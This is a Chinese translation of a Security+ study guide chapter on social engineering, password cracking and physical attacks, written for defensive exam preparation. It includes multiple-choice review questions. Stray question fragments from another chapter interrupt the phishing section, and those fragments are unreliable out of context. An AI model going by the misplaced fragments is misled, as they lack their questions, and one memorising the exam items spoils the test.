  \n\n\n\n\n## 第 4 章：社会工程学、物理攻击和密码攻击\n\n社会工程学技术侧重于信息安全的人为因素。使用社会工程学技术，安全专业人员和攻击者可以完成各种任务，范围从获取信息到进入建筑物、系统和网络。\n\
  \n本章探讨社会工程学技术和相关实践，从垃圾箱翻找到肩窥和鲸钓。我们将讨论社会工程学攻击的基本原则，以及现代影响力活动如何利用社会工程学概念和社交媒体来左右观点和反应。\n\
  \n社会工程学和网络钓鱼攻击通常先于密码攻击，本章后面你将回顾密码攻击方法，如暴力破解攻击、彩虹表和字典攻击。渗透测试人员和攻击者可亲自实施的物理攻击，将完成你对这些攻击方法的探索。\n\
  \n### 社会工程学\n\n社会工程学是通过各种策略操纵他人以实现预期行动的做法。社会工程师致力于影响其目标，使其采取原本可能不会采取的行动。\n\n有许多关键原则被用来成功地实施社会工程学攻击，尽管原则列表及其名称因参考来源而异，但\
  \ Security+ 考试重点关注以下七项：\n\n*   **权威**，依赖于大多数人会服从看似掌权或知识渊博之人的命令这一事实，无论他们实际上是否如此。利用权威原则的社会工程师可能会声称自己是经理、政府官员，或其他在他们所处情境中拥有权威的人。\n\
  *   **恐吓**依靠恐吓或欺凌个人使其采取预期行动。被针对的个人会感到受到威胁，并通过做社会工程师希望他们做的事来回应。\n*   **共识**型社会工程学利用人们倾向于做别人正在做的事情这一事实来说服他们采取行动。基于共识的社会工程学攻击可能会指出某部门的其他所有人都已经点击了某个链接，或者可能提供关于产品的虚假推荐，使其看起来很安全。在某些分类体系中，共识被称为“社会认同”。\n\
  *   **稀缺性**用于社会工程学场景，通过让某物看起来像是最后一个可用的而使其更具吸引力。\n*   **熟悉度**型攻击依赖于你喜欢该个人，甚至该个人声称代表的组织。\n\
  *   **信任**，很像熟悉度，依赖于与被针对个人的联系。与熟悉度不同，信任依赖于目标相信社会工程师是诚实的，并且会兑现他们的承诺或威胁。\n*   **紧迫性**迫使目标快速行动，通常没有时间进行批判性思考或验证请求。紧迫性通常与其他原则结合使用，例如权威或恐吓。\n\
  \n这些原则很少单独使用。当社会工程师结合使用它们时——例如，声称自己是高级领导（权威），然后坚持该高级领导有紧急需求（紧迫性），并告知目标如果不立即采取行动可能会失去工作（恐吓）——在许多情况下，他们比仅使用单一原则更有可能成功。社会工程学的一个关键部分是了解目标、人类如何反应，以及如何利用压力反应来达到目的。\n\
  \n#### 社会工程学技术\n\n社会工程学不仅涉及你刚读到的原则。还有技术性和非技术性攻击，它们利用这些原则来实现攻击者和渗透测试人员想要的结果。作为安全专业人员，你需要了解这些技术、它们包含的内容，以及是什么让它们彼此不同。\n\
  \n##### 网络钓鱼\n\n**网络钓鱼**是一个广义术语，用于描述欺诈性地获取信息，通常专注于用户名和密码等凭证，以及信用卡号码和相关数据等敏感个人信息。网络钓鱼最常通过电子邮件进行，但存在各种网络钓鱼技术，包括**短信钓鱼**，即通过短信进行的网络钓鱼，以及**语音钓鱼**，即通过电话进行的网络钓鱼。\n\
  \n## 练习题\n\n### 问题 3\n她应该禁用出站和入站网络访问，以便仅验证正常的内部流量。\n\n### 问题 4\n她应该禁用所有防火墙规则，以便验证所有潜在流量。\n\
  \n### 问题 13\nSelah 希望确保恶意软件从系统中彻底清除。她应该怎么做以确保这一点？\n\n1.  运行多个反恶意软件工具并使用它们清除所有检测到的威胁。\n\
  2.  擦除驱动器并从已知良好的介质重新安装。\n3.  在反恶意软件软件中使用删除设置而不是隔离设置。\n4.  无法确保系统安全，应将其销毁。\n\n###\
  \ 问题 14\n哪种恶意软件因被亲密关系中的人用来监视伴侣而常被称为跟踪软件？\n\n1.  蠕虫\n2.  RATs（远程访问木马）\n3.  加密恶意软件\n\
  4.  PUPs（潜在有害程序）\n\n### 问题 15\nBen 想要分析他认为可能是其组织员工编写的恶意 Python 代码。他可以做什么来确定代码是否恶意？\n\
  \n1.  对其运行反编译器以便阅读代码。\n2.  使用文本编辑器打开文件以审查代码。\n3.  使用防病毒工具测试代码。\n4.  将 Python 代码提交到恶意软件测试网站。\n\
  \n### 问题 16\nVBA 代码最有可能出现在哪种类型的恶意软件中？\n\n1.  宏病毒\n2.  RATs（远程访问木马）\n3.  蠕虫\n4. \
  \ 逻辑炸弹\n\n### 问题 17\nAngela 想要限制恶意 Bash 脚本的潜在影响。在不对大多数用户造成显著可用性影响的情况下，她可以使用以下哪种最有效的技术来实现这一目标？\n\
  \n1.  禁用 Bash。\n2.  切换到另一种 Shell。\n3.  使用 Bash 的受限模式。\n4.  防止执行 Bash 脚本。\n\n###\
  \ 问题 18\nFred 接到电话要求响应一台感染恶意软件的系统。到达时，他发现屏幕上显示一条消息：“向以下地址发送 0.5 个比特币以恢复您的文件。” Fred\
  \ 让系统恢复正常运行的最有效方法是什么？\n\n1.  支付比特币赎金。\n2.  擦除系统并重新安装。\n3.  如果有可用备份，则从备份恢复。\n4. \
  \ 运行反恶意软件软件以清除恶意软件。\n\n### 问题 19\n哪种恶意软件连接到命令与控制系统，允许攻击者远程管理、控制和更新它？\n\n1.  僵尸程序\n\
  2.  无人机\n3.  吸血鬼\n4.  蠕虫\n\n### 问题 20\nJames 发现其组织中一台工作站检测到宏病毒。感染的最可能途径是什么？\n\n\
  1.  通过 Web 浏览器的“路过式下载”\n2.  蠕虫传播了宏病毒\n3.  用户有意为受感染的文件启用了宏\n4.  远程访问木马被用来安装宏病毒\n\n\
  \n\n\n\n#### 社会工程学技术\n\n##### 钓鱼攻击变体\n\n特定术语也用于描述针对特定目标的钓鱼攻击尝试。**鱼叉式网络钓鱼**针对组织中的特定个人或群体，试图收集所需的信息或获取访问权限。**鲸钓攻击**与鱼叉式网络钓鱼非常相似，也针对特定人员，但鲸钓攻击的目标是高级员工，如\
  \ CEO 和 CFO——公司里的“大鱼”，因此得名“鲸钓”。\n\n与大多数社会工程学技术一样，针对所有类型钓鱼攻击最常见的防御手段之一是提高意识。教育员工了解钓鱼攻击以及如何识别和应对钓鱼攻击，甚至定期进行演练，都是降低钓鱼攻击成功风险的常用手段。技术手段也同样存在，包括利用信誉工具、关键字和文本模式匹配以及其他检测潜在钓鱼邮件、电话或短信的技术方法的过滤机制，这些都有助于防止钓鱼攻击。\n\
  \n##### 凭证收集\n\n**凭证收集**是收集用户名和密码等凭证的过程。凭证收集通常通过钓鱼攻击实施，但也可能通过系统入侵导致用户数据库和密码被获取、使用设置为窃取凭证的登录或远程访问工具，或任何其他能为攻击者收集凭证的技术来完成。\n\
  \n一旦凭证被收集，攻击者通常会利用它们发动进一步攻击，其中金融攻击是首要目标。虽然很难完全阻止凭证收集，但多因素认证（MFA）仍然是一种强有力的控制措施，有助于限制成功的凭证收集攻击的影响。用户意识、能够阻止钓鱼邮件等收集攻击的技术工具，以及强有力的监控和响应流程，都有助于应对凭证收集和被收集凭证的滥用。\n\
  \n##### 网站攻击\n\n针对网站的攻击也被社会工程师所利用，**域名劫持**就是一个例子。域名劫持攻击将流量从合法网站重定向到恶意版本。域名劫持通常需要一次成功的技术攻击，以便更改本地\
  \ PC 或受信任的本地 DNS 服务器上的 DNS 条目，从而实现流量重定向。\n\n拼写抢注者使用拼写错误且与合法网站 URL 相似但略有不同的域名来实施**拼写抢注**攻击。拼写抢注者依赖于这样一个事实：人们会输错\
  \ URL 并最终进入他们的网站，从而带来广告流量，甚至有时利用基于拼写错误的网站来推销类似但非正规的产品。\n\n与域名劫持不同，**水坑攻击**不会重定向用户；相反，它们利用目标经常访问的网站来攻击目标。这些经常被访问的网站就像动物的水坑一样，让攻击者能够部署攻击，因为他们知道受害者会访问该网站。一旦知道目标会使用哪个网站，攻击者就可以专注于攻破它，要么直接攻击该网站，要么通过其他方式（如广告网络）部署恶意软件。\n\
  \n### 垃圾邮件\n\n**垃圾邮件**，有时称为未经请求或垃圾电子邮件，乍一看可能不像是一种社会工程学技术，但垃圾邮件通常采用社会工程学技术，试图诱使收件人打开邮件或点击其中的链接。事实上，垃圾邮件依赖于一个许多社会工程师会利用的潜在真理：如果你发送足够多的诱人信息，很可能就会有人上当！\n\
  \nSecurity+ 考试大纲还包括即时通讯垃圾邮件（SPIM）。虽然该术语出现在考试大纲中，但 SPIM 从未真正成为安全行业广泛使用的术语。你仍应确保为了考试而了解它，并明确知道它专门描述即时通讯垃圾邮件。\n\
  \n##### 面对面技术\n\n尽管我们迄今为止讨论的许多技术依赖技术来实现，但面对面的社会工程学和渗透测试技术也很重要。Security+ 考试大纲包括多种面对面技术，如翻垃圾桶、偷窥和尾随。\n\
  \n虽然它并不真正是一种社会工程学技术，但**翻垃圾桶**是一种非常有效的信息收集技术。它正如其名：从垃圾桶中检索潜在的敏感信息。翻垃圾桶可以提供大量关于组织的信息，包括文档和笔记。想要避免这种情况的组织会保护他们的垃圾桶，使用文档安全销毁服务，并以其他方式确保他们的垃圾真的是垃圾，不包含任何有用的东西。\n\
  \n**偷窥**是指从一个人肩膀上方窥视以获取密码或其他数据等信息的过程。虽然偷窥通常意味着实际上从一个人肩膀上方窥视，但其他类似的攻击（如看一个人身后镜子中输入凭证的倒影）也会被视为偷窥。防止偷窥要求潜在目标保持警惕，尽管像笔记本电脑等移动设备上的偏振安全镜片等工具可以帮助防止在公共场所发生偷窥。\n\
  \n**尾随**是一种物理入侵攻击，只需跟随拥有授权访问权限的人进入某个区域，这样当他们打开安全门时，你也可以跟着通过。与偷窥一样，尾随最好通过个人警惕来防止。如果有人试图跟着你通过安全门，你应该让他们出示自己的凭证，而不是放他们进去，或者立即报告入侵行为！\n\
  \n**套取信息**，通常称为诱导，是一种在目标未意识到的情况下收集信息的技术。奉承、假装无知，甚至充当顾问或倾听者等技术都是诱导工作的常见要素。引导目标谈论事情、故意发表错误陈述以便他们用所需信息纠正诱导者，以及其他技术都是诱导过程的一部分。理想情况下，经历过诱导攻击的社会工程学目标永远不会意识到他们提供的信息超出了预期，或者只会在事后很久才意识到。\n\
  \n**前置**可以指三件事之一：\n\n1.  添加表达或短语，例如在一组电子邮件标题中添加“SAFE”，试图欺骗用户认为它已通过反垃圾邮件工具\n2.  作为另一次攻击的一部分添加信息以操纵结果\n\
  3.  通过社会工程学对话建议话题，引导目标走向社会工程师正在寻找的相关信息\n\n##### 身份欺诈和冒充\n\n假装成别人是社会工程师工具箱中的关键工具，与我们讨论的所有其他社会工程学技术一样，它可用于恶意目的。这些技术中的每一种都将目标相信冒充者的意愿与社会工程学原则相结合，创造出一种场景，让社会工程师获得他们想要的访问权限、数据或其他结果。\n\
  \n**借口攻击**是利用编造的场景来证明你接近某个人的合理性的过程。借口攻击通常用作冒充工作的一部分，使冒充者更可信。有意识的目标可以通过提问或要求验证来帮助挫败借口攻击和冒充攻击。在许多情况下，仅仅进行一次验证电话就能挫败此类尝试。\n\
  \n\n\n\n###### 身份欺诈\n\n*身份欺诈*，或称身份盗窃，是指使用他人的身份。虽然身份欺诈通常被恶意行为者用于谋取经济利益，但它也可能作为渗透测试或其他安全工作的一部分被使用。事实上，在某些情况下，*冒充*，即表现得好像你是另一个人，可以是一种有限形式的身份欺诈。在其他情况下，冒充则不那么具体，使用它的社会工程师或攻击者可能只是假装成一名快递员或服务提供商的员工，而不是声称拥有某个特定身份。\n\
  \n除了这些更直接的个人互动外，*骗局*也是常见现象。骗局是故意的谎言，形式多样，从病毒骗局到假新闻。社交媒体在许多现代骗局中扮演着重要角色，攻击者和社会工程师可能会利用当前的骗局来辅助他们的社会工程尝试。\n\
  \n最后一种欺诈类型是*发票诈骗*，即向组织发送虚假发票，希望收到付款。发票诈骗可以是实体的，也可以是电子的，它们依赖于收件人不去核实发票是否合法。\n\n######\
  \ 侦察与冒充\n\n社会工程学是收集信息的绝佳方式，因此常被用作侦察工作的一部分。社会工程学可用于电话、电子邮件和其他联系方式中，以获取比公开可用信息更多的目标信息。同时，现场和面对面的侦察工作使用社会工程学技术来获取访问权限、收集信息，并绕过安全系统和流程。\n\
  \n##### 影响力战役\n\n随着网络战和传统战争以更深层、更有意义的方式持续交叉重叠，在线*影响力战役*（传统上专注于*社交媒体*、电子邮件和其他在线为中心的媒介）已成为所谓*混合战争*的一部分。尽管混合战争的正式定义仍在演变，但普遍认为它包括低于冲突门槛的竞争，这可能包括网络战等主动措施，以及宣传和信息战。\n\
  \n然而，影响力战役本身并非网络战的专属领域。个人和组织开展影响力战役，以将舆论引导至他们期望的方向。甚至广告活动也可被视为一种影响力战役，但总体而言，大多数影响力战役都与虚假信息战役相关联。针对\
  \ Security+ 考试，你应该了解影响力战役与社交媒体作为各类民族国家行为体混合战争努力一部分时紧密耦合的角色。\n\n#### 密码攻击\n\n虽然社会工程学常被用于获取密码或访问权限，但还有其他攻击密码的方法。从在暴力破解攻击中逐个尝试密码，到利用预计算密码哈希的查找系统将获取的密码哈希与已知数据库进行核对的技术性攻击，均可帮助攻击者和渗透测试人员攻击密码。\n\
  \nSecurity+ 考试重点关注几种关键的密码相关攻击：\n\n*   **暴力破解攻击**，即遍历密码直到找到有效的一个。实际的暴力破解方法可能比单纯使用密码列表更复杂，通常涉及使用常见密码的字典、专门挑选的目标可能使用的词汇，以及用于应对复杂性规则的修改规则。无论其输入多么优雅或经过深思熟虑，暴力破解归根结底只是一个尝试不同变体直到成功的过程。\n\
  \n*   **密码喷射**攻击是一种暴力破解攻击形式，它尝试对许多账户使用单个密码或一小组密码。如果你知道目标使用特定的默认密码或一组密码，这种方法可能特别有效。例如，如果你要攻击一支运动队的粉丝网站，粉丝的常见口号、知名球员的名字以及其他与该队相关的常用术语可能是密码喷射攻击的良好候选对象。\n\
  \n*   **字典攻击**是另一种暴力破解攻击形式，它使用单词列表进行尝试。常见的暴力破解字典广泛可用，像 `John the Ripper` 这样流行的开源密码破解工具内置了单词列表（字典）。许多渗透测试人员会在其情报收集和侦察过程中构建自己的自定义字典。\n\
  \n无论采用何种密码攻击机制，攻击方法之间的一个重要区别在于它们是**在线**发生（因此针对可能设有防御措施的实时系统），还是**离线**针对被攻破或捕获的密码存储进行。如果你能从密码存储中捕获哈希密码，**彩虹表**等工具会非常有用。彩虹表是一个易于搜索的数据库，包含使用与捕获的密码文件相同哈希方法预计算的哈希值。因此，如果你捕获了一组使用\
  \ MD5 哈希的密码，你可以为大多数合理的密码长度计算甚至购买一整套密码，然后只需在表中查找这些密码的哈希值即可。\n\n如果你捕获了密码文件，也可以对其使用**密码破解器**。如图\
  \ 4.1 所示，`John the Ripper` 等密码破解器尝试通过针对多种常见密码存储格式进行暴力破解和字典攻击来破解密码。\n\n![图 4.1 John\
  \ the Ripper](img/c04f001.png)\n\n**图 4.1** John the Ripper\n\n`John the Ripper`\
  \ 等密码破解工具也可用作密码评估工具。一些组织继续定期使用密码破解器对其密码存储进行测试，以检查弱密码和易被破解的密码。在许多情况下，MFA 的使用配合密码复杂性要求已很大程度上取代了这一评估过程，这一趋势可能会持续下去。\n\
  \n当然，并非每个系统都维护良好，渗透测试人员或攻击者最喜欢的机会是找到**明文**或**未加密密码**以获取。如果没有某种形式的保护，仅以列表形式维护的密码很容易被即使是最随意的攻击者获取并重复使用。如前所述，使用强密码哈希机制，以及使用盐和胡椒（在哈希前添加到密码中的额外数据，使得彩虹表等工具更难使用）等技术，有助于保护密码。事实上，密码存储的最佳实践不依赖加密；它们依赖于永不存储密码，而是使用精心构造的密码哈希在登录时验证密码。\n\
  \n### 物理攻击\n\n社会工程学和现场渗透测试往往相辅相成，因此社会工程学的物理层面拥有自己的一套工具和技术。Security+ 考试大纲涵盖了几个最常见的示例，你需要了解其中的每一个以备考。\n\
  \n**恶意闪存驱动器**攻击主要分为两类。渗透测试人员（以及潜在的攻击者）可能会在目标组织毫无戒备的受害者容易捡到并插入的位置丢弃驱动器。有时会通过在驱动器上贴上引人注目的标签来增加一层社会工程学手段，使其更有可能被插入：绩效评估、财务规划或其他会诱惑受害者的关键词。\n\
  \n\n\n\n\n### 恶意设备与物理攻击\n\n恶意闪存驱动器和其他设备有时实际上也是一种特洛伊木马，例如设备在出厂时或在供应链环节被篡改时预装了恶意软件，随后被发货或交付。这种情况过去在数码相框中尤为普遍，但任何能够存储文件的\
  \ USB 连接设备都可能成为此类攻击的潜在载体，即使它不是 USB 闪存驱动器。\n\n#### 恶意 USB 数据线\n\n*恶意 USB 数据线*也确实存在，尽管它们不太常见，因为制造它们需要专门的工程设计，而不仅仅是购买大宗商品闪存驱动器那么简单。恶意\
  \ USB 数据线的优势在于，当它替换现有数据线时可以有效地隐形，不会像闪存驱动器那样容易被注意到。恶意数据线通常被配置为显示为人机接口设备（例如键盘），除了部署恶意软件外，还可能与计算机交互以发送按键或捕获数据。\n\
  \n#### 卡片克隆与窃取\n\n*卡片克隆*攻击专注于从卡片（如常用于门禁的 RFID 卡和磁条卡）中获取信息。攻击者还可能实施*窃取*攻击，利用隐藏或伪造的读卡器，或通过社会工程学配合手持读卡器来获取（窃取）卡片数据，随后使用克隆工具将信用卡和门禁卡复制供自己使用。如果卡片没有额外的内置保护（如加密证书和智能芯片）使其难以克隆，卡片克隆就很难被检测到。易于克隆的磁条卡和基于\
  \ RFID 的卡片通常只能通过目视检查来验证它们是否为原始卡片，从而被发现。\n\n#### 供应链攻击\n\n物理攻击的最后一种选择是针对组织供应链的攻击。*供应链攻击*试图在设备、系统或软件到达组织之前就将其攻破。在美国，政府对此问题高度重视，以至于在国防部的主持下运营着“可信代工厂”计划。该计划确保机密和非机密集成电路、设备及其他关键要素的供应链安全，并确保制造商持续经营并受到适当保护，以保证可信设备始终值得信赖。\n\
  \n对于单个组织而言，供应链安全要难得多，但从可信供应商而非二级市场供应商处采购，并通过使用防篡改全息密封贴纸等物理安全措施确保设备未被第三方篡改，有助于降低供应链攻击发生的可能性。\n\
  \n### 总结\n\n社会工程学技术侧重于利用人类的反应和心理来收集信息，并对个人和组织实施攻击。广泛的社会工程学技术依赖于一些通用原则，这些原则描述了基于人们对压力或紧张反应来影响他们的方法。\n\
  \n安全专业人员需要了解社会工程学如何在网络钓鱼、冒充和侦察等攻击中被利用。每种技术都有其独特的社会工程学技巧组合和影响，使其与众不同。\n\n针对组织的物理攻击也依赖社会工程学概念来取得成功。利用恶意\
  \ USB 设备（如数据线和闪存驱动器）利用人类行为诱使用户插入它们，而针对门禁卡的攻击可能使用窃取器或其他技术来克隆组织使用的门禁卡。\n\n密码攻击侧重于以加密、哈希或明文形式获取密码，或通过猜测密码以获取对系统或设备的访问权限。\n\
  \n所有这些攻击都需要在组织的运行环境中进行评估和考量。随着组织从本地物理基础设施迁移到云服务，必须考虑的威胁和攻击模型也需要随之改变。\n\n### 考试要点\n\
  \n#### 社会工程学的七大核心原则\n\n**社会工程学有七大核心原则。** Security+ 考试大纲重点关注这七大社会工程学原则。*权威* 依赖于受害者相信该人有理由掌权或处于权力地位。*恐吓*\
  \ 依赖于欺凌或恐吓目标使其按要求行事。*共识* 建立在个人对他人的信任以及他们对他人正在做什么或相信什么的看法之上。*稀缺* 利用人类对有限供应的反应。*熟悉度*\
  \ 利用你的预期和习惯来对付你。*信任* 被建立起来，然后被用来对付目标。*紧迫感* 是最后一项，它让社会工程师表达的内容看起来仿佛是立即需要的。\n\n####\
  \ 社会工程学技术\n\n**社会工程学使用许多技术。** 许多对抗性和安全技术都依赖社会工程学。网络钓鱼及其相关技术（鱼叉式网络钓鱼、鲸钓、短信钓鱼和语音钓鱼）旨在利用社会工程学技术驱动响应以获取个人信息。像尾随和肩窥这样的技术被用于现场获取信息访问权。诱导信息和冒充可用于获取数据或访问权限。在这些及其他技术中，技术手段、人际手段和物理手段的组合被用来实现社会工程师的目标。\n\
  \n#### 密码攻击\n\n**密码可以通过多种方式获取和破解。** 密码攻击既可以在线针对活动系统进行，也可以离线使用捕获的密码存储进行。暴力攻击（如喷射攻击和字典攻击）以及密码破解在许多情况下都能恢复密码。未加密或明文密码以及不当的存储方法，使得能够访问它们的攻击者更容易发动攻击。\n\
  \n#### 物理攻击与供应链\n\n**物理攻击依赖社会工程学。** 社会工程师利用现场物理攻击来访问组织和网络。恶意 USB 闪存驱动器和数据线，以及卡片克隆和窃取攻击，都是社会工程师工具箱的一部分。此外，社会工程师和其他攻击者可能以供应链为目标，供应链面临设备和软件在到达组织前被篡改的物理攻击风险。能够接触供应商或组织依赖的物流链的社会工程师，可以在组织取得采购物品的所有权之前就破坏其安全性。\n\
  \n### 复习题\n\n1.  以下哪项是对尾随的最佳描述？\n\n    1.  跟随某人通过他们刚解锁的门\n    2.  搞清楚如何解锁安全区域\n\
  \    3.  在会议中坐在某人旁边\n    4.  从某人的桌子上窃取信息\n\n2.  当你将网络钓鱼与 IP 语音相结合时，称为：\n\n    1.\
  \  欺骗\n    2.  Spooning（注：原文为 Spooning，此处为干扰项，通常翻译为“勺子式攻击”或音译“斯普宁”，但考试语境下保留原意或标注为干扰项）\n\
  \    3.  鲸钓\n    4.  语音钓鱼\n\n3.  Alan 在 Susan 登录时从房间另一端读取了她的密码。他使用了什么类型的技术？\n\n\
  \    1.  中间人房间攻击\n    2.  肩窥\n    3.  中间人攻击\n    4.  借口攻击\n\n4.  Joanna 恢复了一个密码文件，其中密码以\
  \ MD5 哈希形式存储。她可以使用什么工具来破解密码？\n\n    1.  MD5sum\n    2.  John the Ripper\n    3.\
  \  GPG\n    4.  Netcat\n\n5.  渗透测试人员使用恶意闪存驱动器最常见的技术是什么？\n\n    1.  邮寄给目标\n    2.\
  \  潜入办公室并将其留在抽屉里\n    3.  在停车场分发，就像它们被丢弃在那里一样\n    4.  将它们包装成快递的样子，写上目标姓名送达\n\n\
  6.  Selah 作为渗透测试的一部分，用恶意软件感染了目标公司用户经常访问的网站上的广告。她使用了什么技术？\n\n\n\n\n1.  水坑攻击\n\n2.\
  \  语音钓鱼\n\n3.  鲸钓攻击\n\n4.  错字域名抢注\n\n7.  Ben 在组织的垃圾桶中翻找敏感文件、内部笔记和其他有用信息。什么术语描述这种类型的活动？\n\
  \n    1.  废弃物工程\n\n    2.  垃圾桶翻找\n\n    3.  垃圾钓鱼\n\n    4.  垃圾桶收割\n\n8.  刷卡攻击通常与攻击者的什么后续步骤相关联？\n\
  \n    1.  钓鱼攻击\n\n    2.  垃圾桶翻找\n\n    3.  语音钓鱼\n\n    4.  克隆\n\n9.  Alaina 怀疑她的组织可能成为\
  \ SPIM 攻击的目标。她担心的是什么技术？\n\n    1.  即时通讯垃圾信息\n\n    2.  管理者的社会说服与恐吓\n\n    3.  互联网媒体的社会说服\n\
  \n    4.  内部媒体垃圾信息\n\n10.  Alex 发现他组织最近订购的网络路由器运行的是修改过的固件版本，在与制造商提供的哈希值比对时不匹配。Alex\
  \ 应将此攻击归类为哪种类型？\n\n     1.  影响行动\n\n     2.  恶作剧/骗局\n\n     3.  供应链攻击\n\n     4.\
  \  域名劫持攻击\n\n11.  Nicole 不小心在浏览器中输入了 `www.smazon.com`，发现被导向了一个充满广告和弹窗的不同网站。以下哪项最准确地描述了她遭遇的攻击类型？\n\
  \n     1.  DNS 劫持\n\n     2.  域名劫持\n\n     3.  错字域名抢注\n\n     4.  Hosts 文件篡改\n\n\
  12.  Lucca 的组织运行着一个混合数据中心，系统分布在微软 Azure 云和本地设施中。以下哪种攻击是他可以在两个地点都建立控制措施应对的？\n\n \
  \    1.  偷窥\n\n     2.  尾随\n\n     3.  垃圾桶翻找\n\n     4.  钓鱼攻击\n\n13.  Alaina 发现有人建立了一个与她组织银行网站一模一样的网站。以下哪个术语最能描述这种攻击？\n\
  \n     1.  钓鱼攻击\n\n     2.  域名劫持\n\n     3.  错字域名抢注\n\n     4.  尾随\n\n14.  最近有个来电者被转接给了\
  \ Amanda，她是公司的一名初级 IT 员工。来电者自称是组织的 IT 主管，称因电商网站出现持续问题，需要她立即关闭组织的防火墙。Amanda 做出更改后，发现来电者并非\
  \ IT 主管，而是公司聘请的渗透测试人员。哪条社会工程学原则最符合此类攻击？\n\n     1.  权威\n\n     2.  共识\n\n     3.\
  \  稀缺\n\n     4.  信任\n\n15.  哪类恶意行为体最可能使用混合战争？\n\n     1.  脚本小子\n\n     2.  黑客活动家\n\
  \n     3.  内部威胁\n\n     4.  国家行为体\n\n16.  Sharif 收到一张账单，上面是他不认为公司申请过或享受过的服务。这是什么社会工程学技术？\n\
  \n     1.  凭证收集\n\n     2.  恶作剧/骗局\n\n     3.  侦察\n\n     4.  发票诈骗\n\n17.  Naomi\
  \ 接到一份关于短信钓鱼的报告。她应该寻找哪种类型的攻击？\n\n     1.  钓鱼邮件中的压缩文件\n\n     2.  基于短信的钓鱼\n\n   \
  \  3.  基于语音邮件的钓鱼\n\n     4.  基于服务器的钓鱼\n\n18.  Charles 想了解目标公司内部的安全程序，但不想让交谈对象意识到他在收集组织信息。他与员工闲聊，让他们在不知不觉中透露安全程序。在社会工程工作中，什么术语描述这一过程？\n\
  \n     1.  诱导/探询\n\n     2.  暗示\n\n     3.  域名劫持\n\n     4.  前置\n\n19.  一名来电者联系上了\
  \ Carlos 公司的 IT 支持人员，称公司董事长正在出差，需要立即访问其账户但不知为何被锁定。他们告诉 IT 支持人员，如果董事长无法重置密码，公司可能会失去一笔大单。如果\
  \ Carlos 接到此报告，应将攻击者的手段归类为哪条社会工程学原则？\n\n     1.  稀缺\n\n     2.  熟悉度\n\n     3. \
  \ 共识\n\n     4.  紧迫性\n\n20.  哪种钓鱼攻击针对特定员工群体，例如公司财务部的所有经理？\n\n     1.  短信钓鱼\n\n \
  \    2.  定向钓鱼\n\n     3.  鲸钓攻击\n\n     4.  语音钓鱼\n\n## 第 5 章\n\n安全评估与测试\n\n当今的网络安全环境中存在许多安全威胁。在前几章中，你已经了解了动机各异的黑客、恶意代码和社会工程学带来的威胁。网络安全专业人员负责构建、运行和维护安全控制措施以抵御这些威胁。维护工作的一个重要组成部分是定期进行安全评估和测试，以确保控制措施正常运行，且环境中不存在可被利用的漏洞。\n\
  \n本章首先讨论漏洞管理，包括漏洞扫描的设计、计划和结果解读。随后讨论渗透测试，这是一种让网络安全专业人员扮演攻击者角色以测试安全控制措施的评估工具。最后讨论可作为持续培训和评估计划一部分的网络安全演练。\n\
  \n### 漏洞管理\n\n我们的技术环境错综复杂。我们运行服务器、终端系统、网络设备和许多其他组件，每个组件都运行着数百万行代码并处理复杂的配置。无论我们如何努力保护这些系统，它们不可避免地包含漏洞，且新漏洞会定期出现。\n\
  \n*漏洞管理* 计划在识别、确定优先级和修复环境中的漏洞方面发挥着至关重要的作用。它们利用 *漏洞扫描* 在漏洞出现时检测新漏洞，然后实施修复工作流来解决最高优先级的漏洞。每个组织都应将漏洞管理纳入其网络安全计划中。\n\
  \n#### 识别扫描目标\n\n一旦组织决定进行漏洞扫描，并确定适用于其扫描的法规要求（如果有），就会进入规划过程的更详细阶段。下一步是确定漏洞扫描将覆盖哪些系统。一些组织选择在扫描过程中覆盖所有系统，而另一些组织则根据许多不同问题的答案，以不同方式（或根本不）扫描系统，这些问题包括：\n\
  \n*   系统存储、处理或传输的信息的数据分类是什么？\n*   系统是否暴露在互联网或其他公共/半公共网络中？\n*   系统提供什么服务？\n*   系统是生产、测试还是开发系统？\n\
  \n组织还使用自动化技术来识别扫描可能覆盖的系统。网络安全专业人员使用扫描工具搜索网络中的连接系统，无论这些系统之前是已知还是未知，并建立 `资产清单`。图 5.1\
  \ 展示了一个使用 Qualys 漏洞扫描器的资产清单功能开发的资产地图示例。\n\n![图 5.1 Qualys 资产地图](img/c05f001.png)\n\
  \n**图 5.1** Qualys 资产地图\n\n\n\n管理员随后可以使用有关系统类型及其处理信息的附加信息来补充此资产清单。这些信息有助于判断哪些系统是关键的，哪些是非关键的。资产清单和`资产关键性`信息有助于指导关于扫描类型、扫描频率，以及管理员应优先修复扫描检测到的漏洞的决策。\n\
  \n#### 确定扫描频率\n\n网络安全专业人员依赖自动化来帮助他们以高效、有效的方式履行职责。漏洞扫描工具允许自动安排扫描，以减轻管理员的负担。图 5.2\
  \ 展示了在 Tenable 的 Nessus 产品中如何配置这些扫描的示例。Nessus 是最早面世的漏洞扫描器之一，至今仍被广泛使用。管理员可以指定满足其安全、合规和业务要求的计划。\n\
  \n![FIGURE 5.2 Configuring a Nessus scan](img/c05f002.png)\n\n**图 5.2** 配置 Nessus\
  \ 扫描\n\n管理员应将这些扫描配置为在检测到新漏洞时提供自动警报。许多安全团队将其扫描配置为生成扫描结果的自动电子邮件报告，例如 图 5.3 所示的报告。\n\
  \n许多不同的因素会影响组织决定对其系统进行漏洞扫描的频率：\n\n*   组织的`风险偏好`是其容忍环境中风险的意愿。如果一个组织极度厌恶风险，它可能会选择更频繁地进行扫描，以最小化漏洞产生到被扫描检测到之间的时间窗口。\n\
  *   `法规要求`，例如支付卡行业数据安全标准 (PCI DSS) 或联邦信息安全管理法案 (FISMA) 施加的要求，可能会规定漏洞扫描的最低频率。这些要求也可能来自企业政策。\n\
  \n    ![FIGURE 5.3 Sample Nessus scan report](img/c05f003.png)\n\n    **图 5.3**\
  \ Nessus 扫描报告示例\n\n*   `技术限制`可能会限制扫描频率。例如，扫描系统每天可能只能执行一定数量的扫描，组织可能需要调整扫描频率以确保所有扫描都能成功完成。\n\
  *   `业务限制`可能会阻止组织在业务高峰期进行资源密集型的漏洞扫描，以避免中断关键流程。\n*   `许可限制`可能会限制扫描器消耗的带宽或可同时进行的扫描数量。\n\
  \n网络安全专业人员在规划漏洞扫描计划时，必须平衡上述每一项考量。通常明智的做法是从小规模开始，并随着时间的推移缓慢扩大漏洞扫描的范围和频率，以避免使扫描基础设施或企业系统不堪重负。\n\
